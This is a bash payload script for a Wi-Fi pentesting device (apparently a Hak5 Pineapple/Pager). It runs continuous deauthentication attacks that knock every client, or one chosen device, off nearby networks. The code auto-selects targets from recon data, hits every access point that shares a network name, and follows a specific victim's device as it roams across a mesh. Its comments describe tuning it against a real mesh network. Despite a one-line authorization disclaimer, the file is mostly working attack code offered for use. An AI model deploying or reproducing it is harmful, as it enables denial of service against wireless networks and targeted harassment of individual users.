#!/bin/bash
# Title: WiFi Deauth
# Author: florian
# Description: Continuously deauth a network's clients until you press B. Auto-picks from Recon, or scans for nearby networks if launched plain. Same-name networks (mesh APs) are grouped - pick once to hit all of them. Chases a specific target across a mesh network's access points as it roams.
# Version: 9.0
#
# Runs continuously (repeats the deauth every couple seconds, since a
# single round just gets clients reassociating within moments) until you
# press B - not a single fire-and-forget shot.
#
# Three ways this gets its target, in order:
#  1. RECON-selected: launch it by selecting a client from the Pineapple
#     Recon device list and choosing this action - target MAC/BSSID/channel
#     come straight from what recon observed (that ONE client, since you
#     picked it deliberately).
#  2. SMART SCAN: launched plain (from the payloads menu). If the Pager is
#     NOT connected to a WiFi network, it lists nearby SSIDs recon has
#     seen (LIST_PICKER) - several access points sharing one name (a mesh
#     network, or just unrelated routers with the same default name) show
#     as ONE entry with an AP count, e.g. "Hotspot (3)", and picking it
#     attacks every one of them. If connected, it uses that specific
#     network directly. Either way, ALL clients are targeted by default -
#     you don't need to pick one.
#  3. MANUAL: "Enter manually" is always one of the choices if recon has
#     nothing to show yet.
#
# HISTORY - v5.1 through v8.0 explored a "second radio" concept (raw 802.11
# injection on the internal radio, running alongside the normal
# DEAUTH_CLIENT attack on the external one) to add attack surface for
# mesh networks. REMOVED in v9.0: it caused repeated hard hangs on real
# hardware (confirmed via persistent crash logging added specifically to
# investigate - the kernel went completely silent with no panic/oops
# trace, meaning a genuine USB/firmware-level lockup requiring a manual
# power cycle to recover, not a soft crash). Also, "internal only" vs
# "external only" was never actually a real choice to begin with -
# confirmed live that Hak5's official DEAUTH_CLIENT/PINEAPPLE_EXAMINE_
# CHANNEL commands take no radio-select parameter at all and always drive
# whichever single radio PineAP itself designates (the external USB
# adapter, once one is plugged in) - there was no safe way to pick
# "internal" through official commands either. Given the real
# instability risk and the fact the picker never did anything genuine
# either way, it's gone.
#
# v9.0's actual fix for the underlying problem (mesh networks don't
# visibly disconnect from single-AP deauth, confirmed live against a real
# 8-AP FRITZ! mesh: 3 of 8 APs were on protected DFS channels - no tool
# can legally transmit there - and the rest support fast roaming, so
# kicking a client off one AP just bounces it to a sibling AP nearly
# invisibly) is CHASING: when a specific target MAC is known (not the
# broadcast "everyone" default), deauth.sh now periodically re-checks
# which BSSID that MAC is actually transmitting from and prioritizes
# attacking THAT one, instead of blindly round-robining every AP on a
# fixed schedule regardless of where the target actually is. See
# deauth.sh's own find_target_bssid()/chase logic for the mechanism.
# Chasing only kicks in with a real target MAC (recon-selected client,
# or manually entered) - broadcast-target attacks still hit every AP
# each round as before, since there's no single client to chase.
#
# BUG FOUND AND FIXED (reported live - "sometimes it used cached APs"):
# the nearby-network SQL query had NO time filter at all - it matched
# every AP recon has EVER recorded since the database was created,
# including ones seen once, long ago, that may no longer even be
# broadcasting. Recon itself is confirmed to update continuously (recon.db
# rows were only ~16s old when checked live), so the fix is a real
# freshness filter, not a rescan trigger: the nearby-network query now
# requires `time` within the last 120 seconds, guaranteeing every listed
# AP was actually seen recently, not just at some point in the DB's
# history. deauth.sh's own internal queries (used by --ssid/--all, which
# RE-SCAN every round during a live attack) got the same fix separately,
# since a stale BSSID there could silently anchor an entire attack to a
# dead target for its whole run - not just affect this picker.
#
# IMPORTANT: only run this against networks/clients you are authorized to
# test.

RECON_DB="/root/recon/recon.db"
MANUAL="Enter manually..."
FRESH_WINDOW=120  # seconds - how recently an AP must have been seen to be listed

have_recon_db() { [ -f "$RECON_DB" ] && command -v sqlite3 >/dev/null 2>&1; }

is_wifi_connected() { ip -4 addr show wlan0cli 2>/dev/null | grep -q "inet "; }

connected_bssid() {
    command -v iw >/dev/null 2>&1 || return 1
    iw dev wlan0cli link 2>/dev/null | awk '/Connected to/ {print $3; exit}'
}

if [ ! -x /root/scripts/deauth.sh ]; then
    ERROR_DIALOG "deauth.sh not found - run the toolkit setup.py first."
    exit 1
fi

__use_ssid=""
__bssid=""
__fresh_cutoff=$(( $(date +%s) - FRESH_WINDOW ))

if [ -n "${_RECON_SELECTED_CLIENT_MAC_ADDRESS:-}" ] && [ -n "${_RECON_SELECTED_AP_BSSID:-}" ]; then
    __bssid="$_RECON_SELECTED_AP_BSSID"
    __target="$_RECON_SELECTED_CLIENT_MAC_ADDRESS"
    __channel="${_RECON_SELECTED_AP_CHANNEL:-6}"
    LOG "Using recon-selected target: $__target on $__bssid (ch $__channel)"

elif is_wifi_connected && have_recon_db; then
    __bssid=$(connected_bssid)
    # BUG FOUND AND FIXED (found via code review, confirmed by tracing
    # connected_bssid()'s own contract): this used to LOG "Connected to
    # $__bssid..." unconditionally, BEFORE checking whether $__bssid was
    # actually non-empty. connected_bssid() (lib/common.sh) can legitimately
    # return empty - it requires `iw` on PATH and a specific "Connected to"
    # line format, and returns nothing if either isn't there - which is
    # EXACTLY the case the very next `if [ -z "$__bssid" ]` block already
    # exists to handle via a manual MAC_PICKER fallback. Hitting that path
    # meant logging the nonsensical "Connected to  - targeting all its
    # clients." (empty BSSID) immediately before contradicting it by asking
    # the user to enter one manually. deauth.sh's own --pick flow (the
    # sibling implementation of this exact "connected, look up BSSID" case)
    # already gets this right - it only announces success when $cbssid is
    # actually non-empty, and says so plainly when it isn't. Match that here.
    if [ -n "$__bssid" ]; then
        LOG "Connected to $__bssid - targeting all its clients."
    else
        LOG "Connected, but couldn't determine the AP's BSSID via iw - falling back to manual entry."
        __bssid=$(MAC_PICKER "AP BSSID" "") || exit 0
    fi
    __cbssid_nc=$(echo "$__bssid" | tr -d ':' | tr 'a-f' 'A-F')
    # BUG FOUND AND FIXED (real, live, high-impact - the SAME BLOB/TEXT
    # comparison bug found and fixed in deauth.sh's channel_of_bssid():
    # recon.db's `ssid.bssid` column is declared TEXT but actually stores
    # BLOB - confirmed live via typeof(bssid). A plain `bssid = '...'`
    # equality NEVER matches, so this lookup has been silently returning
    # empty on every single connected-WiFi launch, proposing the
    # hardcoded "6" default regardless of the AP's real channel. This
    # exact mesh runs on 36/40 (5GHz), not 6 - if a user accepted the
    # default without noticing (the whole point of a pre-filled default
    # is that people usually do), every packet this payload ever sent
    # while auto-detecting a connected AP went out on the wrong physical
    # channel and did nothing, looking exactly like "deauth doesn't
    # work" from the outside.
    __known_channel=$(sqlite3 "$RECON_DB" \
        "SELECT channel FROM ssid WHERE type = 8 AND CAST(bssid AS TEXT) = '$__cbssid_nc' ORDER BY time DESC LIMIT 1;" \
        2>/dev/null)
    __channel=$(NUMBER_PICKER "Channel" "${__known_channel:-6}") || exit 0
    __target="FF:FF:FF:FF:FF:FF"

elif have_recon_db; then
    LOG "Not connected to WiFi - scanning recon for nearby networks."
    # Grouped by SSID (not one row per BSSID) - several access points
    # sharing one name (mesh, or coincidence) show as ONE pick with a
    # count, matching deauth.sh --scan/--pick's own grouping. Only APs
    # seen within the last $FRESH_WINDOW seconds are listed - recon
    # confirmed to update continuously, so a stale entry here means the
    # AP genuinely hasn't been seen recently, not that recon is behind.
    # BUG FOUND AND FIXED (same BLOB/TEXT class as the CAST fix already
    # applied a few lines up for the connected-AP channel lookup, missed
    # here): bssid/ssid are BLOB storage class in recon.db, so a bare
    # `!= ''` (a TEXT literal) never excludes anything - a BLOB is never
    # equal to a TEXT value regardless of content, so "not equal to empty"
    # is always true even for a genuinely empty BLOB. Confirmed empirically
    # against this exact schema pattern (a local sqlite3 test: an
    # empty-BLOB value passed the uncast `!= ''` check while
    # CAST(...AS TEXT) != '' correctly excluded it). Real effect: a
    # hidden/cloaked AP (which legitimately beacons an empty SSID) could
    # show up as a blank-name entry in this picker instead of being
    # filtered out.
    # BUG FOUND AND FIXED (confirmed via a standalone repro, not just
    # theory - same class as deauth.sh's scan_ssid_groups() fix, found
    # independently here since this payload has its own separate query):
    # this used to SELECT ssid FIRST, ahead of COUNT(*), with `|` as the
    # row separator. SSID is attacker-controlled/arbitrary data (802.11's
    # SSID element is just an arbitrary byte string, no character
    # restriction) - an SSID containing a literal `|` byte collides with
    # the `|` used as this output's OWN field separator. Reproduced
    # standalone: a row for SSID "Evil|Net" with count 3, fed through the
    # exact `IFS='|' read -r ssid count` pattern below, produced
    # ssid="Evil" and count="Net|3" instead of the real values - `[ "$count"
    # = "1" ]` then silently compares against garbage instead of a real
    # count, and __ssids ends up holding the truncated "Evil" instead of
    # the true SSID, so picking that entry would launch deauth.sh --ssid
    # "Evil" (a network recon has no APs for) instead of the real target.
    # Fix: `read`'s own documented behavior stuffs any surplus delimited
    # fields into the LAST variable verbatim (embedded separators and all)
    # rather than splitting further - so COUNT(*) first, ssid LAST (with
    # only one fixed column ahead of it) makes an embedded `|` in the SSID
    # transparent instead of corrupting the parse. Re-verified against the
    # same standalone repro with the columns swapped: `read -r count ssid`
    # correctly recovered ssid="Evil|Net" intact.
    __groups=$(sqlite3 -separator '|' "$RECON_DB" \
        "SELECT COUNT(*), ssid FROM (
             SELECT s.bssid AS bssid, s.ssid AS ssid, MAX(s.signal) AS signal
             FROM ssid s
             WHERE s.type = 8 AND s.bssid IS NOT NULL AND CAST(s.bssid AS TEXT) != '' AND s.ssid IS NOT NULL AND CAST(s.ssid AS TEXT) != ''
               AND s.time >= $__fresh_cutoff
             GROUP BY s.bssid
         ) GROUP BY ssid ORDER BY MAX(signal) DESC LIMIT 15;" \
        2>/dev/null)

    if [ -n "$__groups" ]; then
        __opts=()
        __ssids=()
        while IFS='|' read -r count ssid; do
            [ -z "$ssid" ] && continue
            if [ "$count" = "1" ]; then
                __opts+=("$ssid")
            else
                __opts+=("$ssid ($count APs)")
            fi
            __ssids+=("$ssid")
        done <<< "$__groups"
        __opts+=("$MANUAL")
        __picked=$(LIST_PICKER "Pick a network (all clients targeted)" "${__opts[@]}" "${__opts[0]}") || exit 0
    else
        LOG "No networks seen by recon in the last ${FRESH_WINDOW}s - manual entry."
        __picked="$MANUAL"
    fi

    if [ "$__picked" = "$MANUAL" ]; then
        __bssid=$(MAC_PICKER "AP BSSID" "") || exit 0
        __channel=$(NUMBER_PICKER "Channel" "6") || exit 0
    else
        for __i in "${!__opts[@]}"; do
            if [ "${__opts[$__i]}" = "$__picked" ]; then
                __use_ssid="${__ssids[$__i]}"
                break
            fi
        done
    fi
    __target="FF:FF:FF:FF:FF:FF"

else
    # BIG CHANGE (found via code review): this branch is reached whenever
    # recon.db is simply missing - even if the Pager IS currently connected
    # to WiFi as a client. It never checked that though, so a connected-but-
    # no-recon-db run always asked for the BSSID fully blank, despite
    # connected_bssid() (already defined above, already used by the
    # connected+recon.db branch) being able to answer that directly. Now
    # prefills it the same way that branch does when it can.
    LOG "No recon selection and no recon database found - asking manually."
    __prefill_bssid="${_RECON_SELECTED_AP_BSSID:-}"
    if [ -z "$__prefill_bssid" ] && is_wifi_connected; then
        __prefill_bssid=$(connected_bssid)
        [ -n "$__prefill_bssid" ] && LOG "Connected to $__prefill_bssid - prefilling it below."
    fi
    __bssid=$(MAC_PICKER "AP BSSID" "$__prefill_bssid") || exit 0
    __target=$(MAC_PICKER "Target client (FF:FF:FF:FF:FF:FF for all)" "FF:FF:FF:FF:FF:FF") || exit 0
    __channel=$(NUMBER_PICKER "Channel" "6") || exit 0
fi

# Against a mesh (--ssid path) with a specific (non-broadcast) target,
# deauth.sh's chase mode kicks in automatically - it re-checks which AP
# the target is actually on and prioritizes that one instead of blind
# round-robin. No extra flag needed here; it's just what --target (a
# real MAC, not FF:FF:FF:FF:FF:FF) plus --ssid does now.
__is_broadcast_target=0
[ "$(echo "$__target" | tr 'a-f' 'A-F')" = "FF:FF:FF:FF:FF:FF" ] && __is_broadcast_target=1

if [ -n "$__use_ssid" ]; then
    if ! CONFIRMATION_DIALOG "Deauth $__target on every AP broadcasting '$__use_ssid' until stopped?"; then
        LOG "User cancelled."
        exit 0
    fi
    if [ "$__is_broadcast_target" = "0" ]; then
        LOG "Chasing $__target across every AP named '$__use_ssid' - press B to stop."
    else
        LOG "Deauthing $__target across every AP named '$__use_ssid' - press B to stop."
    fi
    /root/scripts/deauth.sh --ssid "$__use_ssid" --target "$__target" --background -y
else
    if ! CONFIRMATION_DIALOG "Deauth $__target from $__bssid until stopped?"; then
        LOG "User cancelled."
        exit 0
    fi
    LOG "Deauthing $__target from $__bssid on channel $__channel - press B to stop."
    /root/scripts/deauth.sh --bssid "$__bssid" --target "$__target" --channel "$__channel" --background -y
fi

# BUG FOUND AND FIXED (reported live): this used to show "Deauth running -
# press B to stop" unconditionally right after launching --background,
# with no check that the attack actually started. deauth.sh returning
# quickly (it always does - --background forks immediately) was being
# read as success even when the launch silently failed. Now verifies via
# deauth.sh --status before declaring success, and tells the truth if it
# didn't actually start.
sleep 1
if ! /root/scripts/deauth.sh --status 2>&1 | grep -qi running; then
    ERROR_DIALOG "Deauth did not start - check the log (deauth.sh --status) and try again."
    LOG "Deauth failed to start - not showing 'running' state."
    exit 1
fi

ALERT "Deauth running - press B to stop"
WAIT_FOR_BUTTON_PRESS B

/root/scripts/deauth.sh --stop
LOG "Deauth stopped."
ALERT "Deauth stopped"
